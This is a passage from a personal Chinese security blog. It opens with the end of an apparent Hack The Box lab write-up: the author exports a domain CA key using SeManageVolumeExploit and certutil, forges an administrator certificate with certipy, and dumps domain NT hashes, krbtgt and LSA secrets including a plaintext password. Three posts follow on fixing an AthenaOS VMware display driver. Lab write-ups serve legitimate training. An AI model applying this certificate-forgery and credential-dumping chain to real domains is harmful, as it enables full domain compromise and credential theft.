6de9cb26d2b98c01ec4e9e8b34824aa2_7989b711-2e3f-4107-9aae-fb8df2e3b958</span><br><span class="line">-a--s-        11/3/2024   8:03 PM           2222 76944fb33636aeddb9590521c2e8815a_7989b711-2e3f-4107-9aae-fb8df2e3b958</span><br><span class="line">-a--s-        11/3/2024   8:03 PM           2241 d6d986f09a1ee04e24c949879fdb506c_7989b711-2e3f-4107-9aae-fb8df2e3b958</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys&gt; icacls C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line">C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys Everyone:(R,W)</span><br><span class="line">                                                BUILTIN\Administrators:(F)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br><span class="line">*Evil-WinRM* PS C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys&gt; . C:\xxx\SeManageVolumeExploit.exe</span><br><span class="line">Entries changed: 867</span><br><span class="line"></span><br><span class="line">DONE</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys&gt; icacls C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line">C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys Everyone:(R,W)</span><br><span class="line">                                                BUILTIN\Users:(F)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>
<p>看一下有没有根证书以及序列号（唯一标识符）<br><img src="/images/certificate-24.png"><br>导出来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Programdata\microsoft\crypto\rsa\machinekeys&gt; certutil -exportpfx <span class="string">&#x27;75b2f4bbf31f108945147b466131bdca&#x27;</span> ca.pfx</span><br><span class="line">MY <span class="string">&quot;Personal&quot;</span></span><br><span class="line">================ Certificate 2 ================</span><br><span class="line">Serial Number: 75b2f4bbf31f108945147b466131bdca</span><br><span class="line">Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb</span><br><span class="line"> NotBefore: 11/3/2024 3:55 PM</span><br><span class="line"> NotAfter: 11/3/2034 4:05 PM</span><br><span class="line">Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb</span><br><span class="line">Certificate Template Name (Certificate Type): CA</span><br><span class="line">CA Version: V0.0</span><br><span class="line">Signature matches Public Key</span><br><span class="line">Root Certificate: Subject matches Issuer</span><br><span class="line">Template: CA, Root Certification Authority</span><br><span class="line">Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8</span><br><span class="line">  Key Container = Certificate-LTD-CA</span><br><span class="line">  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958</span><br><span class="line">  Provider = Microsoft Software Key Storage Provider</span><br><span class="line">Signature <span class="built_in">test</span> passed</span><br><span class="line">Enter new password <span class="keyword">for</span> output file ca.pfx:</span><br><span class="line">Enter new password:</span><br><span class="line">Confirm new password:</span><br><span class="line">CertUtil: -exportPFX <span class="built_in">command</span> completed successfully.</span><br><span class="line">*Evil-WinRM* PS C:\Programdata\microsoft\crypto\rsa\machinekeys&gt; download ca.pfx</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\Programdata\microsoft\crypto\rsa\machinekeys\ca.pfx to ca.pfx</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>
<p>本地签发一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&quot;+27511s&quot;</span> certipy forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject <span class="string">&#x27;CN=Administrator,CN=Users,DC=CERTIFICATE,DC=HTB&#x27;</span>  </span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Saving forged certificate and private key to <span class="string">&#x27;administrator_forged.pfx&#x27;</span></span><br><span class="line">[*] Wrote forged certificate and private key to <span class="string">&#x27;administrator_forged.pfx&#x27;</span></span><br><span class="line"></span><br><span class="line">$ faketime -f <span class="string">&quot;+27511s&quot;</span> certipy auth -pfx administrator_forged.pfx -username administrator -dc-ip 10.10.11.71                                      </span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Certificate identities:</span><br><span class="line">[*]     SAN UPN: <span class="string">&#x27;administrator@certificate.htb&#x27;</span></span><br><span class="line">[*] Using principal: <span class="string">&#x27;administrator@certificate.htb&#x27;</span></span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saving credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Wrote credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@certificate.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6</span><br></pre></td></tr></table></figure>
<p>got root</p>
<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0x5cea1e66da8824f09a4e388596e60a4a</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:60f6b8c46a9c6d8e0635b619c069b2ae:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction <span class="keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="string">&#x27;t have hash information.</span></span><br><span class="line"><span class="string">[*] Dumping cached domain logon information (domain/username:hash)</span></span><br><span class="line"><span class="string">[*] Dumping LSA Secrets</span></span><br><span class="line"><span class="string">[*] $MACHINE.ACC </span></span><br><span class="line"><span class="string">CERTIFICATE\DC01$:aes256-cts-hmac-sha1-96:37e0e73332edfcc623b54ae20124ba786f453d664b05c950e19957b01aa82226</span></span><br><span class="line"><span class="string">CERTIFICATE\DC01$:aes128-cts-hmac-sha1-96:cb4b0249daf270bce4f51db03e407c38</span></span><br><span class="line"><span class="string">CERTIFICATE\DC01$:des-cbc-md5:0219c23d986eefb0</span></span><br><span class="line"><span class="string">CERTIFICATE\DC01$:plain_password_hex:b9e738a3d3c27735c6c2e77c4718f2434791aa8de0ccd96c4570de531c91fc7c96973fef80e4cbc9f9a00217923216eb5c2f6e64699f0d53c97f5f44d40e40cb4d4cbb8a7e3e85eefce6b72c43740e5a5a87a83a041e5bca193771025752807f8db1a666382fcabb9eca24822746fb5197638ef3515a9a8e7ea3b48a6656bc9152e0a9167026cf36961a320806768ab02438a4444efdcd043cf1a3d3f78152006ea52e5dae8364b7f64f9dacca923478bfbd24686af0a907a531e5329f1e8ce95d0b9da1513f6637fd34084e06dc93a1fd2e36d74aab657e2bdf0ac00352a3085ff70f2dd53e21c160e99a11960cebdf</span></span><br><span class="line"><span class="string">CERTIFICATE\DC01$:aad3b435b51404eeaad3b435b51404ee:f36e0bc3c9a34c3acdb8b79df54f27cd:::</span></span><br><span class="line"><span class="string">[*] DPAPI_SYSTEM </span></span><br><span class="line"><span class="string">dpapi_machinekey:0xc3ff4e4015e130aeac8a1230c29c6cd80a123f75</span></span><br><span class="line"><span class="string">dpapi_userkey:0x36a4f4aae2cdbee83d6abfc5e9d546d09e8eaf04</span></span><br><span class="line"><span class="string">[*] NL$KM </span></span><br><span class="line"><span class="string"> 0000   DB 80 E3 7D 2D F9 3B 06  ED DB EC 4B 5B 13 1C 1E   ...&#125;-.;....K[...</span></span><br><span class="line"><span class="string"> 0010   18 0E 97 5D 3E A9 50 81  F9 92 9A 32 97 BC FB 94   ...]&gt;.P....2....</span></span><br><span class="line"><span class="string"> 0020   D0 69 3D C3 70 3C BD 83  AE 53 66 03 3C E7 DB 69   .i=.p&lt;...Sf.&lt;..i</span></span><br><span class="line"><span class="string"> 0030   CF F4 A1 16 B2 58 38 56  2E CF E8 8F 38 51 A3 EE   .....X8V....8Q..</span></span><br><span class="line"><span class="string">NL$KM:db80e37d2df93b06eddbec4b5b131c1e180e975d3ea95081f9929a3297bcfb94d0693dc3703cbd83ae5366033ce7db69cff4a116b25838562ecfe88f3851a3ee</span></span><br><span class="line"><span class="string">[*] _SC_Apache2.4                                                                                                                                                                            </span></span><br><span class="line"><span class="string">CERTIFICATE\xamppuser:x@mppUserPwd!                                                           </span></span><br><span class="line"><span class="string">[*] _SC_mysql                                                                                                                                                                                </span></span><br><span class="line"><span class="string">CERTIFICATE\xamppuser:x@mppUserPwd!                                                                                                                                                          </span></span><br><span class="line"><span class="string">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                </span></span><br><span class="line"><span class="string">[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                         </span></span><br><span class="line"><span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6:::                                                                                                       </span></span><br><span class="line"><span class="string">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                </span></span><br><span class="line"><span class="string">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9de0f65ce37b57bc0a8fce1f9d4402c7:::                                                                                                              </span></span><br><span class="line"><span class="string">Kai.X:1105:aad3b435b51404eeaad3b435b51404ee:003c4c38e98c78352362095a6028f720:::                                                                                                              </span></span><br><span class="line"><span class="string">Sara.B:1109:aad3b435b51404eeaad3b435b51404ee:c2367169e3279fa3e85d9d25f0e85e45:::     </span></span><br><span class="line"><span class="string">John.C:1111:aad3b435b51404eeaad3b435b51404ee:3f6d0e5bbf21d7f1c72a8eebc82547f5:::                                                                                                             </span></span><br><span class="line"><span class="string">Aya.W:1112:aad3b435b51404eeaad3b435b51404ee:a72e757f0f5859819e90d1a71666f933:::                                                                                                              </span></span><br><span class="line"><span class="string">Nya.S:1113:aad3b435b51404eeaad3b435b51404ee:a72e757f0f5859819e90d1a71666f933:::</span></span><br><span class="line"><span class="string">Maya.K:1114:aad3b435b51404eeaad3b435b51404ee:a72e757f0f5859819e90d1a71666f933:::                                                                                                             </span></span><br><span class="line"><span class="string">Lion.SK:1115:aad3b435b51404eeaad3b435b51404ee:3b24c391862f4a8531a245a0217708c4:::                                                                                                            </span></span><br><span class="line"><span class="string">Eva.F:1116:aad3b435b51404eeaad3b435b51404ee:f30914c4b456ef5691bf24b50b332e99:::                                                                                                              </span></span><br><span class="line"><span class="string">Ryan.K:1117:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::                                                                                                             </span></span><br><span class="line"><span class="string">certificate.htb\akeder.kh:1119:aad3b435b51404eeaad3b435b51404ee:9ca9ba1e46bd75574002b8b1967bb2de:::</span></span><br><span class="line"><span class="string">kara.m:1121:aad3b435b51404eeaad3b435b51404ee:831a13eb0ff31d5b80eb062f24bfb210:::              </span></span><br><span class="line"><span class="string">Alex.D:1124:aad3b435b51404eeaad3b435b51404ee:32be964c0519ef40083157825c7949ca:::                                                                                                             </span></span><br><span class="line"><span class="string">certificate.htb\karol.s:1127:aad3b435b51404eeaad3b435b51404ee:a242ea4fbd87f0feff1203bad168b770:::</span></span><br><span class="line"><span class="string">saad.m:1128:aad3b435b51404eeaad3b435b51404ee:a242ea4fbd87f0feff1203bad168b770:::              </span></span><br><span class="line"><span class="string">xamppuser:1130:aad3b435b51404eeaad3b435b51404ee:ed547ca356c218f5e76c2640fc3429ab:::                                                                                                          </span></span><br><span class="line"><span class="string">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f36e0bc3c9a34c3acdb8b79df54f27cd:::                                                                                                              </span></span><br><span class="line"><span class="string">WS-01$:1103:aad3b435b51404eeaad3b435b51404ee:3641f1cd0daa8dfe41e1d1b2dbbed6f4:::</span></span><br><span class="line"><span class="string">WS-05$:1131:aad3b435b51404eeaad3b435b51404ee:eae20b8c895e7ac2e1a4870f71738058:::</span></span><br><span class="line"><span class="string">[*] Kerberos keys grabbed</span></span><br></pre></td></tr></table></figure>

    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A3/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A3/">Athena维修记录补档</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>补档一下我<a href="https://n0nome.github.io/2025/05/27/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95/">上一篇</a>的愚蠢，全程都是自己yy<br>按照<a href="https://n0nome.github.io/2025/05/27/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95/">上一篇</a>的操作最终还是会回归到Blackscreen，费了半天劲啥事也没干成</p>
<p>这一篇就踏踏实实的写一下我的过程吧，最终结果可能还是没修好，但是记录一下</p>
<h2 id="正常安装完成reboot"><a href="#正常安装完成reboot" class="headerlink" title="正常安装完成reboot"></a>正常安装完成reboot</h2><p>我好好去翻了一下官方的<a target="_blank" rel="noopener" href="https://athenaos.org/en/support/troubleshooting/">doc</a><br><img src="/images/athenacon.png"><br>当我尝试F3之后仍然无法今进入tty，那就还是按照上一篇的办法进入tty<br><img src="/images/athenacon-1.png"><br>尝试删除gnome-shell发现没有，那就按照他的安装一下Xorg的包<br>    但是doc中提供的这些包名来自于Fedora 或 RHEL 系列发行版，arch上有他自己的<br>    Fedora&#x2F;RHEL 包名	Arch Linux 对应包名<br>    xorg-x11-server-Xorg	xorg-server<br>    xorg-x11-server-Xwayland	xorg-xwayland<br>    xorg-x11-drv-libinput	xf86-input-libinput<br>    当然也可以安装xorg完整的，不过我没有</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S xorg-server xorg-xwayland xf86-input-libinput</span><br></pre></td></tr></table></figure>
<p><img src="/images/athenacon-2.png"><br>安装完毕之后，有点不敢重启了哈哈哈</p>
<p>同志，大胆重启<br>很好，还是blackscreen，再重启进入tty看一下日志吧</p>
<p>journalctl看报错还是x驱动的报错，那我直接先把他给挪出去</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">╰─&gt;[👾]~ $ <span class="built_in">sudo</span> <span class="built_in">mv</span> /usr/lib/xorg/modules/drivers/vmware_drv.so /root/</span><br><span class="line"><span class="built_in">sudo</span> pacman -S xf86-video-vesa xf86-video-fbdev</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart sddm</span><br><span class="line"></span><br><span class="line">[<span class="built_in">sudo</span>] xxx 的密码：</span><br><span class="line">警告：xf86-video-vesa-2.6.0-2 已经为最新 -- 重新安装</span><br><span class="line">正在解析依赖关系...</span><br><span class="line">正在查找软件包冲突...</span><br><span class="line"></span><br><span class="line">软件包 (2) xf86-video-fbdev-0.5.1-1  xf86-video-vesa-2.6.0-2</span><br><span class="line"></span><br><span class="line">下载大小：      0.01 MiB</span><br><span class="line">全部安装大小：  0.07 MiB</span><br><span class="line">净更新大小：    0.03 MiB</span><br><span class="line"></span><br><span class="line">:: 进行安装吗？ [Y/n] </span><br><span class="line">:: 正在获取软件包......</span><br><span class="line"> xf86-video-fbdev-0.5.1-1-x86_64                                                                              13.3 KiB  54.6 KiB/s 00:00 [####################################################################################] 100%</span><br><span class="line">(2/2) 正在检查密钥环里的密钥                                                                                                             [####################################################################################] 100%</span><br><span class="line">(2/2) 正在检查软件包完整性                                                                                                               [####################################################################################] 100%</span><br><span class="line">(2/2) 正在加载软件包文件                                                                                                                 [####################################################################################] 100%</span><br><span class="line">(2/2) 正在检查文件冲突                                                                                                                   [####################################################################################] 100%</span><br><span class="line">(2/2) 正在检查可用存储空间                                                                                                               [####################################################################################] 100%</span><br><span class="line">:: 正在处理软件包的变化...</span><br><span class="line">(1/2) 正在重新安装 xf86-video-vesa                                                                                                       [####################################################################################] 100%</span><br><span class="line">(2/2) 正在安装 xf86-video-fbdev                                                                                                          [####################################################################################] 100%</span><br><span class="line">:: 正在运行事务后钩子函数...</span><br><span class="line">(1/1) Arming ConditionNeedsUpdate...</span><br></pre></td></tr></table></figure>
<p><img src="/images/athenacon-3.png"><br>然后又回到小窗户了</p>
<p>这可以说明是那个驱动的问题了吧</p>
<h2 id="重新安装一下试试"><a href="#重新安装一下试试" class="headerlink" title="重新安装一下试试"></a>重新安装一下试试</h2><p>其实我感觉在<code>set cyber role</code>的过程之后还是会出现blackscreen<br>不过先重新装一下驱动和open-vm-tools试试</p>
<p>ok，装过了，一碰就G，那个VMware_drv.so只要在那个文件夹里面就不得行。。。</p>

    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A3%E4%BA%8C/%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A3%E4%BA%8C/">Athena维修记录补档二</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code></p>
<h2 id="特大喜讯"><a href="#特大喜讯" class="headerlink" title="特大喜讯"></a>特大喜讯</h2><p>特大喜讯 特大喜讯<br>我终于tmd修好了</p>
<h3 id="如何修复"><a href="#如何修复" class="headerlink" title="如何修复"></a>如何修复</h3><p>目前保守治疗的办法是先正常进行Athena的安装<br>然后grub修改进入tty<br><code>sudo su</code> 进入root用户<br>安装openssh<br>开启ssh服务<br><code>systemctl start ssh</code><br>然后在本地ssh连接(这样方便我们下载编译的)</p>
<p>然后我们找个文件夹，也可以创建一个<br>然后下载<a target="_blank" rel="noopener" href="https://www.x.org/pub/individual/driver/xf86-video-vmware-13.4.0.tar.xz">xorg的VMware驱动</a><br>解压缩编译安装一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf xf86-video-vmware-13.4.0.tar.xz</span><br><span class="line"><span class="built_in">cd</span> xf86-video-vmware-13.4.0</span><br><span class="line">./configure <span class="variable">$XORG_CONFIG</span> &amp;&amp;</span><br><span class="line">make</span><br><span class="line"><span class="built_in">sudo</span> make install</span><br></pre></td></tr></table></figure>
<p>为了确保万无一失，再复制一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> src/.libs/vmware_drv.so /usr/local/lib/xorg/modules/drivers/</span><br></pre></td></tr></table></figure>

<p>然后</p>
<h2 id="然后"><a href="#然后" class="headerlink" title="然后"></a>然后</h2><h2 id="请大胆重启"><a href="#请大胆重启" class="headerlink" title="请大胆重启"></a>请大胆重启</h2><h2 id="然后就可以愉快的使用Athena了"><a href="#然后就可以愉快的使用Athena了" class="headerlink" title="然后就可以愉快的使用Athena了"></a>然后就可以愉快的使用Athena了</h2>
    
    
  </div>

  

  

</article>
  
  <article class="post">
  <header class="post-header">
    <h1 class="post-title">
      
      <a class="post-link" href="/2025/06/19/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95/">Athena维修记录</a>
      
    </h1>

    <div class="post-meta">
      <span class="post-time">
        2025-06-19
      </span>
      
      
      
    </div>
  </header>

  

  <div class="post-content">
    
    
    

    
    <p>最近两天Athena坏了，排查来排查去发现可能是vmware的显卡驱动坏了<br>顺便也总结一下之前<a href="https://n0nome.github.io/2025/04/02/%E6%97%A0%E8%84%91AthenaOS%E5%AE%89%E8%A3%85/%E6%97%A0%E8%84%91AthenaOS%E5%AE%89%E8%A3%85/">无脑安装Athena的错误</a></p>
<h2 id="无脑安装Athena"><a href="#无脑安装Athena" class="headerlink" title="无脑安装Athena"></a>无脑安装Athena</h2><p>在之前的文章中还用proxychains4去挂代理，实际上没什么用<br>现在请在主机上的代理工具上开启<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/TUN/TAP">tun模式</a>，他会创建一个虚拟网卡，将流量都转发到这个上面，具体的在这里不详细讲了，可以<a target="_blank" rel="noopener" href="https://www.google.com/search?q=tun%E6%A8%A1%E5%BC%8F&sca_esv=834482dd15337b1d&rlz=1C1ONGR_en__1147__1147&ei=I2I1aK6wC6yQ4-EPo9qToQQ&ved=0ahUKEwjuzdWFicONAxUsyDgGHSPtJEQQ4dUDCBA&uact=5&oq=tun%E6%A8%A1%E5%BC%8F&gs_lp=Egxnd3Mtd2l6LXNlcnAiCXR1buaooeW8j0ieGVDOA1inGHAIeAGQAQCYAacBoAHECKoBAzAuOLgBA8gBAPgBAZgCCKAC1QLCAgoQABiwAxjWBBhHwgIFEAAYgATCAgoQABiABBhDGIoFwgIUEC4YgAQYxwEYmAUYmQUYngUYrwGYAwCIBgGQBgqSBwM2LjKgB9UJsgcDMC4yuAe7AsIHBzAuMy40LjHIByQ&sclient=gws-wiz-serp">Google</a>一下.</p>
<p>开了tun模式之后再进行安装就可以了，这时候也不需要修改<code>/etc/pacman.conf</code>中的配置了，可以顺利的执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">╰─&gt;[👾]~ $ <span class="built_in">sudo</span> pacman-key --init</span><br><span class="line"></span><br><span class="line">╰─&gt;[👾]~ $ <span class="built_in">sudo</span> pacman -Sy</span><br><span class="line">:: Synchronizing package databases...</span><br><span class="line"> athena is up to <span class="built_in">date</span></span><br><span class="line"> core is up to <span class="built_in">date</span></span><br><span class="line"> extra is up to <span class="built_in">date</span></span><br><span class="line"> multilib is up to <span class="built_in">date</span></span><br><span class="line"> chaotic-aur         627.1 KiB   366 KiB/s 00:02 [#####################################################################################] 100%</span><br></pre></td></tr></table></figure>

<p>正常安装到结束也不会出现什么问题<br><img src="/images/athena.png"></p>
<h2 id="显卡驱动的问题"><a href="#显卡驱动的问题" class="headerlink" title="显卡驱动的问题"></a>显卡驱动的问题</h2><p>这时候重要的问题来了</p>
<p>如果这时候重启，可能会出现我出现的问题——loading kernel之后就黑屏了，没有loading的详细信息，按什么键也不可以进去tty交互页面<br>不信我们来重启一下<br><img src="/images/athena-1.png"><br><img src="/images/athena-2.png"><br>看，还可以看到有一个小窗户</p>
<p>重启一下修改一下grub引导进入tty的交互页面<br><img src="/images/athena-3.png"><br>进入到这个界面的时候按<code>e</code>进入grub命令行<br><img src="/images/athena-4.png"><br>按👇方向键找到下图中的部分<br><img src="/images/athena-5.png"><br>给他改一下<br><img src="/images/athena-6.png"><br>删掉<code>quiet</code>，再结尾加上<code>systemd.unit=multi-user.target nomodeset</code><br>Ctrl+x 然后他会loading<br>这时候就会看到加载过程和tty交互的<br><img src="/images/athena-7.png"><br><img src="/images/athena-8.png"><br>输入刚刚安装创建的用户名回车就可以登录进去了</p>
<p>这里如果自己想要排查的话建议开ssh，然后用ssh连上去，因为在虚拟机的这个交互不太方便</p>
<p>以防万一先装一下openssh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S openssh</span><br><span class="line"><span class="built_in">sudo</span> systemctl start ssh</span><br><span class="line"><span class="built_in">sudo</span> su <span class="comment">#(没错可以直接切换到root)</span></span><br><span class="line">passwd xxx <span class="comment">#你的用户名</span></span><br></pre></td></tr></table></figure>
<p>然后在主机就可以ssh连上去排查了</p>
<h3 id="display-manager"><a href="#display-manager" class="headerlink" title="display-manager"></a>display-manager</h3><p>但你查看display-manager状态的时候会看到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">╰─&gt;[👾]~ $ <span class="built_in">sudo</span> systemctl status display-manager</span><br><span class="line">○ sddm.service - Simple Desktop Display Manager</span><br><span class="line">     Loaded: loaded (/usr/lib/systemd/system/sddm.service; enabled; preset: disabled)</span><br><span class="line">     Active: inactive (dead)</span><br><span class="line">       Docs: man:sddm(1)</span><br><span class="line">             man:sddm.conf(5)</span><br></pre></td></tr></table></figure>
<p>继续</p>
